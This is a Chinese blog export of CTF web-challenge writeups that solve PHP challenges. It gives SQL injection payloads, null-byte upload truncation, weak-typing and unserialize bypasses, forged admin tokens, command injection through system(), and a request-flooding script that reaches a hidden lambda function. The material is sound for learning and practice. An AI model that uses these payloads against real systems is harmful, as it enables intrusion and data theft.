(md5($_GET[&apos;a&apos;]) == md5($_GET[&apos;b&apos;]))die(&apos;Flag: &apos;.$flag);elseprint &apos;Wrong.&apos;;&#125; 和第二题原理一样 payload：http://chinalover.sinaapp.com/web17/index.php?a=QNKCDZO&amp;b=s878926199a 17.变量覆盖 source.php查看源代码，关键php代码整理后如下 12345678910111213141516&lt;?php if ($_SERVER[&quot;REQUEST_METHOD&quot;] == &quot;POST&quot;) &#123;?&gt;&lt;?php extract($_POST); if ($pass == $thepassword_123) &#123;?&gt; &lt;div class=&quot;alert alert-success&quot;&gt; &lt;code&gt;&lt;?php echo $theflag; ?&gt;&lt;/code&gt; &lt;/div&gt;&lt;?php &#125;?&gt;&lt;?php &#125;?&gt; extract() 函数从数组中将变量导入到当前的符号表。 该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。 第二个参数 type 用于指定当某个变量已经存在，而数组中又有同名元素时，extract() 函数如何对待这样的冲突。 该函数返回成功导入到符号表中的变量数目。 所以这道题给pass和thepassword_123用post传一个相同的值即可 18.php是世界上最好的语言这道题链接也挂了，我没答上 参考一下网上的writeup吧 index.txt核心代码如下 1234567891011&lt;?phpif(eregi(&quot;hackerDJ&quot;,$_GET[id])) &#123; echo(&quot;&lt;p&gt;not allowed!&lt;/p&gt;&quot;); exit();&#125;$_GET[id] = urldecode($_GET[id]);if($_GET[id] == &quot;hackerDJ&quot;)&#123; echo &quot;&lt;p&gt;Access granted!&lt;/p&gt;&quot;; echo &quot;&lt;p&gt;flag: *****************&#125; &lt;/p&gt;&quot;;&#125; eregi()函数判断id是否为hackerDJ，大小写敏感。网页会拒绝任何含有hackerDJ的提交(忽略大小写)，但接受urldecode后为hackerDJ的字符串。 因为url在传入后台时会自动先进行一次url解码，所以这里需要二次编码 hackerDJurl编码后为%68%61%63%6b%65%72%44%4a 二次编码后为%2568%2561%2563%256b%2565%2572%2544%254a 其中%25是%的url编码 19.伪装者提示管理系统只能在本地登陆 改了Referer: 127.0.0.1和X-Forwarded-For: 127.0.0.1都没有成功 看网上的解释好像是服务端代码有问题 XFF头用以标志客户端真实IP，常用在使用HTTP 代理或者负载均衡服务 20.header链接挂了，flag应该就在数据包的头信息中 21.上传绕过介绍一下文件截断绕过攻击 1.文件系统0x00截断 在上传的时候，当文件系统读到【0x00】时，会认为文件已经结束。利用00截断就是利用程序员在写程序时对文件的上传路径过滤不严格，产生0x00上传截断漏洞。通过抓包截断将【evil.php.jpg】后面的一个【.】换成【0x00】。在上传的时候，当文件系统读到【0x00】时，会认为文件已经结束，从而将【evil.php.jpg】的内容写入到【evil.php】中，从而达到攻击的目的。 （0x00是16进制值，不可见。） 2.PHP%00截断 原理与15题类似，使用方法与文件系统0x00截断相同 源码为 12345678&lt;form action=&quot;upload.php&quot; method=&quot;post&quot;enctype=&quot;multipart/form-data&quot;&gt;&lt;label for=&quot;file&quot;&gt;Filename:&lt;/label&gt;&lt;input type=&quot;hidden&quot; name=&quot;dir&quot; value=&quot;/uploads/&quot; /&gt;&lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot; /&gt; &lt;br /&gt;&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Submit&quot; /&gt;&lt;/form&gt; 后台应该是dir和file连接 先尝试上传一个1.jpg文件 提示上传php文件才行，那上传一个1.php试试 提示不被允许的文件类型，使用burp抓一个上传文件的包，尝试filename处截断，发现上传仍然失败。 尝试在目录处截断，成功。 这个地方尝试截断了好几次，发现直接在重放的Raw中改目录名为”/uploads/1.php0x00”或”/uploads/1.php%00”都没有截断成功，最后是要在Hex中直接改为十六进制的00。 我的做法是先在Raw中现把filename的值“1.php”改为”1.php.jpg”，然后把dir路径改为 /uploads/1.php+ 我们知道”+”的十六进制值为2b，所以再去Hex中找到+对应的位置把”2b”改成”00”再重新发包。 传送门：其他文件上传绕过姿势 22.SQL注入1直接看源码 123456789101112131415161718&lt;?phpif($_POST[user] &amp;&amp; $_POST[pass]) &#123; mysql_connect(SAE_MYSQL_HOST_M . &apos;:&apos; . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS); mysql_select_db(SAE_MYSQL_DB); $user = trim($_POST[user]); $pass = md5(trim($_POST[pass])); $sql=&quot;select user from ctf where (user=&apos;&quot;.$user.&quot;&apos;) and (pw=&apos;&quot;.$pass.&quot;&apos;)&quot;; echo &apos;&lt;/br&gt;&apos;.$sql; $query = mysql_fetch_array(mysql_query($sql)); if($query[user]==&quot;admin&quot;) &#123; echo &quot;&lt;p&gt;Logged in! flag:******************** &lt;/p&gt;&quot;; &#125; if($query[user] != &quot;admin&quot;) &#123; echo(&quot;&lt;p&gt;You are not admin!&lt;/p&gt;&quot;); &#125;&#125;echo $query[user];?&gt; 会对传入的参数两端去空格，其中sql构建语句为：select user from ctf where (user=&#39;&quot;.$user.&quot;&#39;) and (pw=&#39;&quot;.$pass.&quot;&#39;) 直接post个user闭合单引号和括号，再随便传个pass让它存在就可以了。 23.pass check12345678910111213$pass=@$_POST[&apos;pass&apos;];$pass1=***********;//被隐藏起来的密码if(isset($pass))&#123;if(@!strcmp($pass,$pass1))&#123;echo &quot;flag:nctf&#123;*&#125;&quot;;&#125;else&#123;echo &quot;the pass is wrong!&quot;;&#125;&#125;else&#123;echo &quot;please input pass!&quot;;&#125;?&gt; 之前提过的php弱类型，strcmp函数在比较失败，即传入数组时会返回null 24.起名字真难123456789101112131415161718192021&lt;?phpfunction noother_says_correct($number)&#123; $one = ord(&apos;1&apos;); $nine = ord(&apos;9&apos;); for ($i = 0; $i &lt; strlen($number); $i++) &#123; $digit = ord($number&#123;$i&#125;); if ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) ) &#123; return false; &#125; &#125; return $number == &apos;54975581388&apos;;&#125;$flag=&apos;*******&apos;;if(noother_says_correct($_GET[&apos;key&apos;])) echo $flag;else echo &apos;access denied&apos;;?&gt; int ord ( string $string )函数：返回字符串 string 第一个字符的 ASCII 码值 分析一下代码，这道题需要传入的key参数中不含有1-9的数字但又等于54975581388，考虑编码解决，发现hex(54975581388)刚好等于0xccccccccc 因此访问url：http://chinalover.sinaapp.com/web12/index.php?key=0xccccccccc 就可以拿到flag辣 25.密码重置tip：重置管理员账号：admin 的密码 burp抓个包看看 放到repeater中把post的user参数改成admin，发现url中get还传了个user1参数，看着像base64编码的，解码发现是ctfuser，所以考虑把user1参数修改为admin经过base64编码后的内容。 26.php反序列化（暂时无法做）123456789101112131415161718192021222324&lt;?phpclass just4fun &#123; var $enter; var $secret;&#125;if (isset($_GET[&apos;pass&apos;])) &#123; $pass = $_GET[&apos;pass&apos;]; if(get_magic_quotes_gpc())&#123; $pass=stripslashes($pass); &#125; $o = unserialize($pass); if ($o) &#123; $o-&gt;secret = &quot;*&quot;; if ($o-&gt;secret === $o-&gt;enter) echo &quot;Congratulation! Here is my secret: &quot;.$o-&gt;secret; else echo &quot;Oh no... You can&apos;t fool me&quot;; &#125; else echo &quot;are you trolling?&quot;;?&gt; 反序列化后的secret成员被赋予未知的值却要求另一成员enter其值与之相同 对象包含的引用在序列化时也会被存储，所以如果enter指向secret的引用，两个成员的值就可以同步变化了 在本地写一段代码 12345678910111213&lt;?phpclass just4fun&#123; var $secret; var $enter ;&#125;$f=new just4fun();$f-&gt;enter=&amp;$f-&gt;secret;$sf=serialize($f);print_r($sf);$usf=unserialize($sf);echo &apos;&lt;br/&gt;&apos;;print_r($usf); 输出如下： O:8:&quot;just4fun&quot;:2:{s:6:&quot;secret&quot;;N;s:5:&quot;enter&quot;;R:2;} 所以访问 http://localhost/cgctf2.php?pass=O:8:%22just4fun%22:2:{s:6:%22secret%22;N;s:5:%22enter%22;R:2;} php反序列化详细的内容我过几天打完ctf去学php代码审计的时候会整理新的博客的！ 27.SQL InjectionTIP:反斜杠可以用来转义 仔细查看相关函数的用法 查看源代码 1234567891011121314151617181920212223&lt;!--#GOAL: login as admin,then get the flag;error_reporting(0);require &apos;db.inc.php&apos;;function clean($str)&#123; if(get_magic_quotes_gpc())&#123; $str=stripslashes($str); &#125; return htmlentities($str, ENT_QUOTES);&#125;$username = @clean((string)$_GET[&apos;username&apos;]);$password = @clean((string)$_GET[&apos;password&apos;]);$query=&apos;SELECT * FROM users WHERE name=\&apos;&apos;.$username.&apos;\&apos; AND pass=\&apos;&apos;.$password.&apos;\&apos;;&apos;;$result=mysql_query($query);if(!$result || mysql_num_rows($result) &lt; 1)&#123; die(&apos;Invalid password!&apos;);&#125;echo $flag;--&gt; sql语句：SELECT * FROM users WHERE name=\&#39;&#39;.$username.&#39;\&#39; AND pass=\&#39;&#39;.$password.&#39;\&#39;; 观察clean函数中的返回值经过htmlentities()函数过滤，这个字符将字符转换为 HTML 转义字符 ，第二个参数如果没有默认只转换双引号，但参数值为ENT_QUOTES时查询文档得知既转换双引号又转换单引号。 我们最终目标是平衡单引号，可是经过这个函数过滤我们无法输入单引号，只能想怎么消灭原来的单引号。 构造payload：?username=\&amp;password= or 1#使得查询语句如下： 12345678SELECT * FROM users WHERE name=&apos;\&apos; AND pass=&apos; or 1%23&apos;即SELECT * FROM users WHERE name=&apos;\&apos; AND pass=&apos; 『 [name]的值为 [&apos; AND pass=]，单引号被转义了，显然逻辑值为false 』or 1 『 但没关系，[false or 1] 的逻辑值为真 』 %23&apos; 『 %23是#的url编码，注释掉多余的单引号 』即select * from users where false or 1 28.综合题打开后发现是一串看不懂的代码，google一下是jsfuck编码，在线解码网站 直接拉到控制台执行，得到 1bc29b36f623ba82aaf6724fd3b16718.php 打开这个网页得到新的提示 根据提示查看http头信息 上网搜了一下，发现这是一个linux下保存历史命令的文件，默认保存在/root/.bash_history .bash_history详解：https://yq.aliyun.com/ziliao/75352 所以尝试打开该目录下这个文件 url：http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/.bash_history 得到新的提示 这是一个linux解压缩的命令，访问新的url：http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/flagbak.zip可以下载这个压缩文件，用文本编辑器打开该文件得到flag 29.system（暂时无法做）pass 30.SQL注入2tip：主要考察union查询 查看关键源代码 12345678910111213141516&lt;?phpif($_POST[user] &amp;&amp; $_POST[pass]) &#123; mysql_connect(SAE_MYSQL_HOST_M . &apos;:&apos; . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS); mysql_select_db(SAE_MYSQL_DB); $user = $_POST[user]; $pass = md5($_POST[pass]); $query = @mysql_fetch_array(mysql_query(&quot;select pw from ctf where user=&apos;$user&apos;&quot;)); if (($query[pw]) &amp;&amp; (!strcasecmp($pass, $query[pw]))) &#123; echo &quot;&lt;p&gt;Logged in! Key: ntcf&#123;**************&#125; &lt;/p&gt;&quot;; &#125; else &#123; echo(&quot;&lt;p&gt;Log in failure!&lt;/p&gt;&quot;); &#125;&#125;?&gt; strcasecmp(str1, str2)：两个字符串相等则返回0 观察一下条件语句 ($query[pw]) &amp;&amp; (!strcasecmp($pass, $query[pw])) mysql_fetch_array() 函数返回的关联数组中键为字段名 构造payload：post一下数据 12user=&apos; union select &apos;bb23bab64934efa2a4e1666109467f43&apos;#&amp;pass=xiangfeng//&apos;bb23bab64934efa2a4e1666109467f43&apos;是&apos;xiangfeng&apos;的MD5值 先用一个单引号把user闭合，然后联合查询xiangfeng的md5值，这样返回的关联数组中pw建的值就是’bb23bab64934efa2a4e1666109467f43’。 31.综合题2见另一篇博客：传送门 32.密码重置21234TIPS:1.管理员邮箱观察一下就可以找到2.linux下一般使用vi编辑器，并且异常退出会留下备份文件3.弱类型bypass 查看网页源代码得到管理员邮箱： 根据提示，学到一个新知识是非正常关闭vi编辑器时会生成一个.swp文件 查看.index.php.swp和.submit.php.swp文件 能打开.submit.php.swp文件，关键代码如下 12345678910111213if(!empty($token)&amp;&amp;!empty($emailAddress))&#123; if(strlen($token)!=10) die(&apos;fail&apos;); if($token!=&apos;0&apos;) die(&apos;fail&apos;); $sql = &quot;SELECT count(*) as num from `user` where token=&apos;$token&apos; AND email=&apos;$emailAddress&apos;&quot;; $r = mysql_query($sql) or die(&apos;db error&apos;); $r = mysql_fetch_assoc($r); $r = $r[&apos;num&apos;]; if($r&gt;0)&#123; echo $flag; &#125;else&#123; echo &quot;失败了呀&quot;; &#125;&#125; 要求token长度为10且token!=0为假，有两种绕过方法，第一种传入token=0000000000绕过，第二种利用弱类型（含有数字内容的字符串也会被转换类型）传入token=0e12345678绕过。 33.file_get_contents1234&lt;!--$file = $_GET[&apos;file&apos;];if(@file_get_contents($file) == &quot;meizijiu&quot;)&#123; echo $nctf;&#125;--&gt; file_get_contents() 函数将整个文件读入一个字符串 这里使用第九题中提到的php伪协议之一：”php://input”可以访问请求的原始数据的只读流,，将post请求中的数据作为PHP代码执行。 34.变量覆盖代码审计类题目 123456&lt;!--foreach($_GET as $key =&gt; $value)&#123; $$key = $value; &#125; if($name == &quot;meizijiu233&quot;)&#123; echo $flag;&#125;--&gt; foreach 遍历数组或对象，它会把当前单元的键名也会在每次循环中被赋给变量 $key，值赋给变量$value $$ 的意思参考可变变量 35. HateIT这道题太难了！我是跟着网上的writeup一步一步复现的，不然自己根本想不到。 先了解一下web中敏感文件泄露的原因和方法：传送门 扫描发现robots.txt，admin.php，upload/upload.php，.git/ upload/uploa.php不能直接访问，估计是看cookie的 使用 dvcs-ripper 工具将 git 文件下载下来，发现只有一个README.md 提示有历史版本，看来得恢复文件，通过git log查看记录 通过git reset回滚版本 拿到了三个通过扩展加密的 php文件和一个txt文件，opcode.txt有index.php，class.php，func.php的 opcode 代码，可以解密这三个php文件。 看一下robots.txt suenc.so 是一个加密扩展文件，可以下载下来，用来解密admin.php 。 因为我很菜还不会逆向，所以直接贴网上师傅们解密出来的代码了 index.php 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152&lt;?php if(!isset($_SESSION)) &#123; session_start(); &#125; echo &apos;...这部分前端内容我就省略不贴了...&apos;; include_once(&apos;func.php&apos;); if(isset($_GET[&apos;username&apos;])) &#123; $username = $_GET[&apos;username&apos;]; $md5 = md5(get_identify().$username); $admin = 0; $token = encrypt($username.&apos;|&apos;.$admin.&apos;|&apos;.$md5); $_SESSION[&apos;sign&apos;] = $md5; $_SESSION[&apos;token&apos;] = $token; &#125; showImage(); if(isset($_GET[&apos;token&apos;]) &amp;&amp; isset($_GET[&apos;sign&apos;])) &#123; $token = $_GET[&apos;token&apos;]; $sign = $_GET[&apos;sign&apos;]; echo &apos;sign : &apos;.$sign.&apos;&lt;br&gt;&apos;; echo &apos;token: &apos;.$token.&apos;&lt;br&gt;&apos;; $info = explode(&apos;|&apos;, decrypt($token)); echo decrypt($token); var_dump($info); if(count($info) == 3) &#123; if(md5(get_identify().$info[0]) == $info[2]) &#123; $sign = $info[1]; $admin = $info[1]; &#125;else&#123; $admin = $info[1]; &#125; &#125; &#125;else&#123; if(isset($_SESSION[&apos;token&apos;]) &amp;&amp; isset($_SESSION[&apos;sign&apos;])) &#123; echo &apos;sign : &apos;.$_SESSION[&apos;sign&apos;].&apos;&lt;br&gt;&apos;; echo &apos;token: &apos;.$_SESSION[&apos;token&apos;].&apos;&lt;br&gt;&apos;; $token = $_SESSION[&apos;token&apos;]; $sign = $_SESSION[&apos;sign&apos;]; $info = explode(&apos;|&apos;, decrypt($token)); if(count($info) == 3) &#123; if(md5(get_identify().$info[0]) == $info[2]) &#123; $sign = $info[1]; $admin = $info[1]; &#125;else&#123; $admin = $info[1]; &#125; echo &apos;&lt;br&gt;&apos;.$admin; &#125; &#125; &#125; if(isset($admin) &amp;&amp; $admin == 3) &#123; $_SESSION[&apos;auth&apos;] = &apos;admin&apos;; echo &quot;&lt;a href=&apos;admin.php&apos;&gt;Admin&lt;/a&gt;&quot;; &#125; func.php 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667&lt;?php/** * Created by PhpStorm. * User: meizj * Date: 2018/2/2 * Time: 下午9:25 */include &quot;class.php&quot;;define(&quot;KEY&quot;,&quot;8690475385984657&quot;);define(&quot;method&quot;,&quot;aes-128-cfb&quot;);define(&quot;BS&quot;,16);define(&quot;IDENTIFY&quot;,&quot;9850375038&quot;);function get_token()&#123; $token = &apos;&apos;; for($i=0;$i&lt;16;$i++)&#123; $token .= chr(rand(1,255)); &#125; return $token;&#125;function enc($s)&#123; $token = get_token(); $code1 = openssl_encrypt(string($s),method,key,OPENSSL_RAW_DATA,$token); $code2 = base64_encode(base64_encode($token.&quot;-&quot;.$code1)); return $code2;&#125;function dec($s)&#123; if($cc = base64_decode(base64_decode($s))) &#123; if($iv = substr($cc,0,16)) &#123; if($d = substr($cc,17)) &#123; if($s = openssl_decrypt($d, method, key, OPENSSL_RAW_DATA,$iv)) &#123; return $s; &#125; else die(&quot;error&quot;); &#125; else return 0; &#125; else return 0; &#125; else return 0;&#125;function uploadImage()&#123; if($_SESSION[&apos;auth&apos;] !== &quot;admin&quot;)&#123; die(&quot;Auth Failed&quot;); &#125; $AllowedType = array( &quot;png&quot;, &quot;gif&quot;, &quot;jpg&quot; ); $filename = $_FILES[&apos;file&apos;][&apos;name&apos;]; $filesize = $_FILES[&apos;file&apos;][&apos;size&apos;]; if($filesize &gt; 1000000)&#123; exit(&quot;Too large&quot;); &#125; $fileext = substr($filename, strrpos($filename, &apos;.&apos;)+1); if(in_array($fileext,$AllowedType))&#123; $file = &quot;thumbs/images/&quot;.md5(time().&quot;admin&quot;).&quot;.&quot;.$fileext; if(file_exists($file))&#123; exit(&quot;File existed already&quot;); &#125;else&#123; move_uploaded_file($_FILES[&apos;file&apos;][&apos;tmp_name&apos;],$file); &#125; &#125;else&#123; exit(&quot;Not Allowed Ext&quot;); &#125;&#125;function viewImage($name)&#123; if($_SESSION[&apos;auth&apos;] !== &quot;admin&quot;)&#123; die(&quot;Auth Failed&quot;); &#125; new ImageView($name);&#125;function showImage()&#123; $obj = new Home(&quot;thumbs/images/&quot;); $obj-&gt;showImg();&#125;function to($str) &#123; return $str . str_repeat(chr(BS - strlen($str) % BS), (BS - strlen($str) % BS));&#125;function re($str) &#123; return substr($str, 0, -ord(substr($str, -1, 1)));&#125;function getkey()&#123; return KEY;&#125;function get_identify()&#123; return IDENTIFY;&#125;function encrypt($str)&#123; $key = getkey(); srand(time() / 300); $token = get_token(); $cipher = bin2hex(mcrypt_encrypt(MCRYPT_RIJNDAEL_128, $key, to($str), MCRYPT_MODE_CFB, $token)); return base64_encode($cipher);&#125;function decrypt($str)&#123; $decode = base64_decode($str); $key = getkey(); srand(time() / 300); $token = get_token(); $bin = hex2bin($str); $plain = re(mcrypt_decrypt(MCRYPT_RIJNDAEL_128, $key,$bin , MCRYPT_MODE_CFB, $token)); return $plain;&#125; class.php 123456789101112131415161718192021222324252627282930313233343536373839&lt;?php/** * Created by PhpStorm. * User: meizj * Date: 2018/2/2 * Time: 下午11:00 */class ImageView&#123; private $filename = &quot;&quot;; function __construct($name)&#123; $this-&gt;filename = &quot;images/$name&quot;; $this-&gt;createThumbnail(); &#125; function createThumbnail()&#123; $e = stripcslashes(preg_replace(&apos;/[^0-9\\\]/&apos;,&apos;&apos;,isset($_GET[&apos;size&apos;])?$_GET[&apos;size&apos;]:25)); system(&quot;/usr/bin/convert &#123;$this-&gt;filename&#125; --resize $e ./thumbs/&#123;$this-&gt;filename&#125;&quot;); &#125; function __toString() &#123; // TODO: Implement __toString() method. return &quot;&lt;a href=&#123;$this-&gt;filename&#125;&gt; &lt;img src=./thumbs/&#123;$this-&gt;filename&#125;&gt;&lt;/a&gt;&quot;; &#125;&#125;class Home&#123; private $dir = &quot;&quot;; public function __construct($dir)&#123; $this-&gt;dir = $dir; &#125; public function showImg()&#123; $files = $this-&gt;getDirFile($this-&gt;dir); foreach ($files as $file)&#123; echo &quot;&lt;img src=$file&gt;&quot;; &#125; &#125; public function getDirFile($dir)&#123; $files = array(); if(!is_dir($dir)) &#123; return $files; &#125; $handle = opendir($dir); if($handle) &#123; while(false !== ($file = readdir($handle))) &#123; if ($file != &apos;.&apos; &amp;&amp; $file != &apos;..&apos;) &#123; $filename = $dir . &quot;/&quot; . $file; if(is_file($filename)) &#123; $files[] = $filename; &#125;else &#123; $files = array_merge($files, get_files($filename)); &#125; &#125; &#125; // end while closedir($handle); &#125; return $files; &#125;&#125; admin.php 123456789101112131415&lt;?php/** * Created by PhpStorm. * User: meizj * Date: 2018/2/2 * Time: 下午9:38 */session_start();if($_SESSION[&apos;auth&apos;]!==&quot;admin&quot;)&#123; die(&quot;Auth Failed!&quot;);&#125;include &quot;func.php&quot;;if(isset($_GET[&apos;action&apos;]))&#123; $action = $_GET[&apos;action&apos;]; if($action == &quot;uploadImage&quot;)&#123; include_once &quot;template/upload.php&quot;; if(isset($_FILES[&apos;file&apos;]))&#123; uploadImage(); &#125; &#125;elseif ($action == &quot;viewImage&quot;)&#123; $file = isset($_GET[&apos;file&apos;])?$_GET[&apos;file&apos;]:&quot;23.jpg&quot;; viewImage($file); &#125;&#125; 先看index.php，这里会将$token解密，如果$admin==3就有权限访问admin.php，我们在本地生成加密 token token的加密脚本 123456789101112131415161718192021222324252627282930313233343536373839404142&lt;?phpdefine(&quot;KEY&quot;,&quot;8690475385984657&quot;);define(&quot;method&quot;,&quot;aes-128-cfb&quot;);define(&quot;BS&quot;,16);define(&quot;IDENTIFY&quot;,&quot;9850375038&quot;);function getkey()&#123; return KEY;&#125;function get_identify()&#123; return IDENTIFY;&#125;function get_token()&#123; $token = &apos;&apos;; for($i=0;$i&lt;16;$i++)&#123; $token .= chr(rand(1,255)); &#125; return $token;&#125;function to($str) &#123; return $str . str_repeat(chr(BS - strlen($str) % BS), (BS - strlen($str) % BS));&#125;function encrypt($str)&#123; $key = getkey(); srand(time() / 300); $token = get_token(); $cipher = bin2hex(mcrypt_encrypt(MCRYPT_RIJNDAEL_128, $key, to($str), MCRYPT_MODE_CFB, $token)); return base64_encode($cipher);&#125;$username = &apos;qwer&apos;;$md5 = md5(get_identify().$username);$admin = &apos;3&apos;;$token = encrypt($username . &apos;|&apos; . $admin . &apos;|&apos; . $md5);echo $md5;echo &quot;\n&quot;echo $token;echo &quot;\n&quot;; 这个指定admin为3，生成一个token windows 跟 linux 的随机数是有差异的 ，所以脚本要拉到linux环境中执行。 拿到了sign和token，访问http://45.76.173.177:23333/?sign=30dd01f4a4aeb5598d20ce3084e120a5&amp;token=YmMxNWI3MzY5MmFjZTA0NzExMzQwMjBhMDNiNGFhODYyZWVjNDQ1ZWY5NjI4ZDQ5NWI3YWE4OGFhNmZkNTg2OWQ0ZTdmYjg4ZTVlMjQ4Mjg5N2JhNWY5NDJjM2FjYzI4 拿到管理员权限后接着看admin.php，文件上传好像是因为没有目录权限，一直上传不上东西，就算了。viewImage调用了ImageView类，最终通过调用系统命令的方式修改图片大小，这里没有对$filename进行过滤，直接拼接到命令执行中，构造 payload 执行命令 接下来就是寻找flag之旅了，最后发现flag在/etc/目录下 获得flag！ 补充一下审计admin.php源码的过程： 跟进viewImage 跟进ImageView 这里可以命令执行 file的地方就可以传进去命令 36. Anonymous这道题学到了很有意思的知识！ 1234Anonymous 匿名的PHP是最好的语言，不是吗？// SUCTF 2018，出题人：梅子酒//题目地址 http://45.76.173.177:23334/ 根据题目可能是考php匿名函数 先看代码 12345678910111213&lt;?php$MY = create_function(&quot;&quot;,&quot;die(`cat flag.php`);&quot;);$hash = bin2hex(openssl_random_pseudo_bytes(32));eval(&quot;function SUCTF_$hash()&#123;&quot; .&quot;global \$MY;&quot; .&quot;\$MY();&quot; .&quot;&#125;&quot;);if(isset($_GET[&apos;func_name&apos;]))&#123; $_GET[&quot;func_name&quot;](); die();&#125;show_source(__FILE__); 先学习一下匿名函数的创建create_function()： string create_function (string $args, string $cod) string $args：变量部分 string $code：方法代码部分 一个官方提供的例子： 123456789&lt;?php$newfunc = create_function(&apos;$a,$b&apos;, &apos;return &quot;ln($a) + ln($b) = &quot; . log($a * $b);&apos;);echo &quot;New anonymous function: $newfunc&quot;;echo $newfunc(2, M_E);// outputs// New anonymous function: lambda_1// ln(2) + ln(2.718281828459) = 1.6931471805599// M_E 是 php 中常量 e 的表示形式?&gt; 顺便学习一下利用create_function()进行代码注入 1234567891011121314&lt;?php$a=$_GET[&apos;id&apos;];$b=&apos;echo&apos;.$a.&quot;;&quot;;$f=create_function(&apos;$a&apos;,$b); /* 参数 &apos;$a&apos; $b 函数体$f($a);?&gt;这个匿名函数相当于这样的创建函数过程:function niming($a)&#123; echo $id.&apos;is&apos;.$a;&#125;payload:?id=1;&#125;phpinfo();/*可以看到phpinfo的信息； 回到这道题，了解一下本题代码中的几个函数 bin2hex() 函数把 ASCII 字符的字符串转换为十六进制值。 openssl_random_pseudo_bytes 函数根据参数来生成指定个数的随机字节。 die() 函数输出一条消息，并退出当前脚本。 这道题用到的知识点是： 匿名函数的名字和apache的Pre-fork模式 Apache的默认模式Pre-fork会随着请求数量的增加而启动若干新的进程 。 create_function创建的是匿名函数，而匿名函数也是有名字的，名字是\x00lambda_%d，其中%d代表他是当前进程中的第几个匿名函数。%d会从1一直进行递增，表示这是当前进程中第几个匿名函数。因此如果开启一个新的php进程，那么这个匿名函数就是\x00lambda_1，所以思路就是通过向Pre-fork模式的apache服务器发送大量请求，致使apache开启新的进程来处理请求，那么传递func_name=%00lambda_1就可以执行函数了。 经过了解以上知识，我写了一个超级简单无脑的python脚本跑了一下就跑出来了flag，就是一直传递func_name=%00lambda_1参数向服务器发起请求，然后直到服务器启动了新的进程这个请求就可以获取flag了。 把url改一下就可以了。这道题改编自HITCON2017的一道web题，只考察了后半部分的知识点，原题orange师傅给出的官方writeup中的poc如下： fork.py 123456789101112131415161718192021import requestsimport socketimport timefrom multiprocessing.dummy import Pool as ThreadPooltry: requests.packages.urllib3.disable_warnings()except: passdef run(i): while 1: HOST = &apos;x.x.x.x&apos; PORT = 80 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((HOST, PORT)) s.sendall(&apos;GET / HTTP/1.1\nHost:web.suctf.asuri.org:81\nConnection: Keep-Alive\n\n&apos;) # s.close() print &apos;ok&apos; time.sleep(0.5)i = 8pool = ThreadPool( i )result = pool.map_async( run,range(i) ).get(0xffff) 我在本地也复现了一下 步骤如下： 123456789exp:# get a cookie$ curl &apos;http://host/&apos; --cookie-jar cookie# force apache to fork new process$ python fork.py# get flag$ curl -b cookie &quot;http://host:port/?func_name=%00lambda_1&quot; 总结终于，经过三天做题两天整理，自己好像摸到了些ctf的门槛，虽然还很菜，关于ctf的下一步可能先去学学隐写术再来刷题。 这些天来学到了很多以前没想过的姿势，也回顾了许多忘了差不多的常见漏洞绕过姿势，都做完之后真的成就感爆棚。 希望能给看这篇文章的你带去一些帮助，要是师傅们发现疏漏了还请快指正我！ 教室有些嘈杂，那些嘈杂此时入耳，仿佛成了我心中的白月光。 Reference南邮CTF-WEB-writeup SUCTF web题目 writeup HITCON2017-writeup整理 hitcon-ctf-2017 orange官方writeup]]></content>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CG-CTF 综合题(2) writeup]]></title>
    <url>%2F2018%2F11%2F13%2FCG-CTF-%E7%BB%BC%E5%90%88%E9%A2%98-2-writeup%2F</url>
    <content type="text"><![CDATA[前言这两天在做南邮 ctf 平台的题，学到了不少新知识，拓展了一些思路。 刚做到了综合题2，做了蛮久，虽然不是很难，但感觉是挺有意思的一道题，于是准备写下我的第一篇writeup。 这道题涉及到 sql injection，文件包含，请求头以及回调后门，偏向于简单的渗透。 - 南邮CTF训练平台：https://cgctf.nuptsast.com/ - 题目地址：http://cms.nuptzj.cn/ 信息搜集进入这道题发现是一个客户留言板，在想会不会是XSS，往下看有个链接 “本CMS说明”，点进去看看。 看一下url:cms.nuptzj.cn/about.php?file=index.php 可能存在文件包含，用来读取提示的那些文件的代码。 网上看到一个下载提示文件的python代码 123456789101112131415161718import requestsimport codecsfrom bs4 import BeautifulSoupurl=&quot;http://cms.nuptzj.cn/about.php?file=&quot;file_list = [&quot;index.php&quot;,&quot;passencode.php&quot;,&quot;say.php&quot;,&quot;config.php&quot;,&quot;antixss.php&quot;,&quot;about.php&quot;,&quot;so.php&quot;,&quot;antiinject.php&quot;,&quot;xlcteam.php&quot;]for i in file_list: res = requests.get(url+i) print(&quot;dowload &quot;+i) if res.status_code==200: res.encoding=&quot;utf8&quot; with codecs.open(i,&quot;w+&quot;,&quot;utf8&quot;) as handle: print(&quot;done&quot;) text = BeautifulSoup(res.text,&quot;lxml&quot;).text handle.write(text)---------------------作者：mylyylmy来源：CSDN原文：https://blog.csdn.net/mylyylmy/article/details/79885143 其实也可以直接在网页看代码。 还提示了数据库表结构，所以推测是用sql注入获取账号密码，那我们还要找到后台页面才行。 先通过读源码获取信息 从passencode.php看出将用户的密码存储为了ASCii码格式 其他的提示php文件代码中也没发现什么，这时突然想起没有读这个about.php本身的代码 1234567891011121314&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;&lt;?php $file = $_GET[&apos;file&apos;]; if ($file == &quot;&quot; || strstr($file, &apos;config.php&apos;)) &#123; echo &quot;file参数不能为空！&quot;;exit(); &#125; else &#123; $cut = strchr($file, &quot;loginxlcteam&quot;); if ($cut == false) &#123; $data = file_get_contents($file); $date = htmlspecialchars($data); echo $date;&#125; else &#123;echo &quot;&lt;script&gt;alert(&apos;敏感目录，禁止查看！但是。。。&apos;)&lt;/script&gt;&quot;; &#125; &#125; 从中发现了敏感目录 loginxlcteam，看名字应该就是后台登陆页面了，直接打开 